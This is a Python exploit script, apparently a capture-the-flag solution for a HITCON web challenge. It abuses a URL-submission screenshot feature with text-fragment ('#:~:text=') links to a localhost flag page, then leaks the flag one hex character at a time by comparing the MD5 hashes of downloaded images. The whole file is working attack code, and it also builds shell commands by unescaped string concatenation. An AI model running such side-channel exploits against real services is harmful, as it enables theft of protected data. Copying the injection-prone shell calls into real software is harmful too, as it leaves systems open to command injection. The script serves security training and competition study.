import sys, os
from bs4 import BeautifulSoup
import requests
from urllib.parse import unquote

target = sys.argv[1]
flag=""
payload = "http://localhost:8000/flag%23:~:text=hitcon{#flag,}"
chars="0123456789abcdef"

def get_img(char):
        res = requests.get(target+"submit?url="+payload.replace("#flag",flag+char)).text
        soup = BeautifulSoup(res, 'html.parser')
        link = soup.find_all('a')[0]
        os.system("wget -q "+target+link.get('href')+" -O "+flag+char)
        return flag+char

def is_valid(image):
        hash = os.popen("cat "+image+" |md5sum").read()
        os.system("rm "+image)
        return ("59562acafb6436ea5fdf660ec57df0cc" not in hash)

for index in range(32):
        for char in chars :
                img_name = get_img(char)
                if is_valid(img_name) :
                        flag += char+"%252d"  # %252d => double url encoded '-'
                        print("[+] hitcon{"+unquote(unquote(flag))[:-1]+"}")
                        break
